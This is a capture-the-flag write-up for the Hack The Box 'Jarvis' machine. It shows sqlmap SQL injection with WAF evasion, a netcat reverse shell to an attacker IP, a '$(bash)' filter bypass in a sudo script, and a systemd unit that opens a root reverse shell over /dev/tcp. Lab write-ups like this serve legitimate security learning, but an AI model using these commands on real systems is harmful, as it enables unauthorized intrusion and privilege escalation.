---
title: "Hack The Box - Jarvis"
tags: [linux,medium,sqli,waf,sqlmap,sudo,systemctl]
categories: HackTheBox-Linux
---


![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%201.png)

## Enumerating Web

→ Found hostname on website :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%202.png)

→ Found SQli vulnerable page :

[http://supersecurehotel.htb/room.php?cod=1](http://supersecurehotel.htb/room.php?cod=1)'

→ There's an WAF which bans us for 90seconds for sending too many requests :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%203.png)

⇒ Running SQLmap with random-agent to bypass the WAF :

**`sqlmap -r invoke.req --random-agent --batch`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%204.png)

→ Popping an shell using sqlmap :

**`sqlmap -r invoke.req --random-agent --batch --os-shell`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%205.png)

→ Lets get an nc shell :

**`nc -e /bin/sh 10.10.14.4 1234`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%206.png)

## Privilege Escalation to User

→ We have sudo on an script

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%207.png)

→ Its an script which takes an ip as input when ran and performs ping on it :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%208.png)

→ There are some filters which avoid us to break the command and get rce as pepper :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%209.png)

→ The filter is missing the character **`$`**

⇒ Exploiting the script :

→ We'll be doing something like this :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2010.png)

**`$(bash)`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2011.png)

## Privilege Escalation to root

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2012.png)

⇒ Exploiting systemctl SUID :

→ myserv.service :

```c
[Unit]
Description = Give me a shell

[Service]
Type=Simple
user=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/5555 0>&1'

[Install]
WantedBy=multi-user.target
```

**`/bin/systemctl enable /home/pepper/myserv.service`**

**`/bin/systemctl start myserv`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Jarvis%20Box%208d4fb6b38b1f48cba518d1f55c01338a/Untitled%2013.png)

